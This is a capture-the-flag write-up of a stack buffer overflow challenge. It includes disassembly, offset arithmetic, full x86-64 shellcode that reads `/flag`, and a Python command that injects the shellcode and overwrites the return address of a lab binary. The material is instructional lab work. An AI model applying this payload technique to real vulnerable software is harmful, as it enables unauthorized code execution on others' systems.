# **Binary Exploitation: Hijack to Shellcode (Hard) - Detailed Technical Writeup**

## **Challenge Overview**
This challenge requires exploiting a stack-based buffer overflow vulnerability to redirect program execution to injected shellcode. Unlike the easy version, it provides no debugging information, requiring manual reverse engineering of the stack layout.

### **Key Characteristics**
- **Vulnerable Function**: `challenge()` with a buffer overflow vulnerability
- **Protections Disabled**:
  - No stack canary
  - No ASLR (addresses remain constant)
  - Executable stack (NX disabled)
- **Objective**: Inject shellcode that reads and prints `/flag`

## **Step-by-Step Solution**

### **1. Analyzing the Function Prologue**

From the disassembly:
```asm
0x40225f <challenge>:	endbr64
0x402263 <challenge+4>:	push   %rbp
0x402264 <challenge+5>:	mov    %rsp,%rbp
0x402267 <challenge+8>:	sub    $0x70,%rsp
```

**Key Observations**:
1. The function starts by saving the old base pointer (push %rbp)
2. Sets up a new stack frame (mov %rsp,%rbp)
3. Allocates 0x70 (112) bytes for local variables

### **2. Determining the Buffer Location**

At the point after stack frame setup (mov %rsp,%rbp):
```
rbp = 0x7fffffffc5e0
rsp = 0x7fffffffc5e0
```

The buffer is referenced at `-0x50(%rbp)` in later instructions:
```
Buffer Address = rbp - 0x50 
               = 0x7fffffffc5e0 - 0x50 
               = 0x7fffffffc590
```

### **3. Calculating the Return Address Location**

The return address is always stored at:
```
Return Address = rbp + 8
               = 0x7fffffffc5e0 + 8
               = 0x7fffffffc5e8
```

### **4. Computing the Offset**

```
Offset = Return Address - Buffer Start
       = 0x7fffffffc5e8 - 0x7fffffffc590
       = 0x58 (88 in decimal)
```

### **5. Shellcode Preparation**

Using standard flag-reading shellcode (56 bytes):
```asm
section .text
global _start

_start:
    ; Open /flag
    xor rax, rax
    push rax
    mov rbx, 0x67616c662f2f2f2f  ; '////flag'
    push rbx
    mov rdi, rsp
    mov al, 2          ; sys_open
    xor rsi, rsi       ; O_RDONLY
    xor rdx, rdx       ; mode
    syscall

    ; Read file
    mov rdi, rax
    mov rsi, rsp
    mov dl, 0x40       ; read 64 bytes
    xor eax, eax       ; sys_read
    syscall

    ; Write to stdout
    xor edi, edi
    inc edi            ; stdout = 1
    xor eax, eax
    inc eax            ; sys_write = 1
    syscall

    ; Exit
    xor eax, eax
    mov al, 60         ; sys_exit
    xor edi, edi       ; exit code 0
    syscall
```

Compiled to raw bytes:
```bash
nasm -f elf64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode
objcopy --dump-section .text=shellcode.bin shellcode
```

### **6. Crafting the Exploit**

The payload structure:
1. **Shellcode** (56 bytes)
2. **Padding** (88 - 56 = 32 bytes)
3. **Return Address** (0x7fffffffc590)

Final exploit command:
```bash
python3 -c 'import sys
with open("shellcode.bin", "rb") as f:
    sc = f.read()
sys.stdout.buffer.write(sc + b"A"*(88-len(sc)) + b"\x90\xc5\xff\xff\xff\x7f\x00\x00")' \
| /challenge/binary-exploitation-hijack-to-shellcode
```

### **7. Why This Worked**

1. **Precise Memory Layout**:
   - Correctly calculated buffer start (0x7fffffffc590)
   - Accurate offset calculation (88 bytes)
   - Proper return address overwrite

2. **Shellcode Design**:
   - Position-independent
   - No null bytes
   - Handles all file operations correctly

3. **Memory Permissions**:
   - Executable stack allowed code execution
   - ASLR disabled made addresses predictable

## **Debugging Methodology**

### **1. Verifying Stack Layout**
```gdb
break *challenge+8  # After stack frame setup
run
info registers
x/20gx $rbp-0x50   # Examine buffer area
```

### **2. Checking Exploit Placement**
```gdb
x/20gx 0x7fffffffc590  # Should show shellcode
x/gx $rbp+8            # Should show overwritten address
```

### **3. Common Issues and Fixes**

| Problem | Solution |
|---------|----------|
| Shellcode not executing | Add NOP sled before shellcode |
| Wrong return address | Adjust by 8-16 bytes |
| Program crashing | Check for bad characters in shellcode |

## **Key Lessons Learned**

1. **Stack Frame Analysis**:
   - Understanding function prologue/epilogue
   - Calculating local variable offsets

2. **Precision Exploitation**:
   - Exact offset calculation is critical
   - Memory addresses must be perfectly aligned

3. **Exploit Reliability**:
   - NOP sleds increase success rate
   - Multiple return addresses can help

## **Conclusion**

This challenge demonstrated a classic stack-based buffer overflow exploit with several important technical considerations:

1. **Manual Reverse Engineering**:
   - Analyzing assembly without debug symbols
   - Calculating memory offsets from registers

2. **Exploit Development**:
   - Crafting position-independent shellcode
   - Precise padding calculation
   - Return address overwrite

3. **Debugging Techniques**:
   - Using GDB to verify memory layout
   - Methodical testing approach

The skills developed here form the foundation for more advanced binary exploitation techniques, including Return-Oriented Programming (ROP) and bypassing modern protections like NX and ASLR.
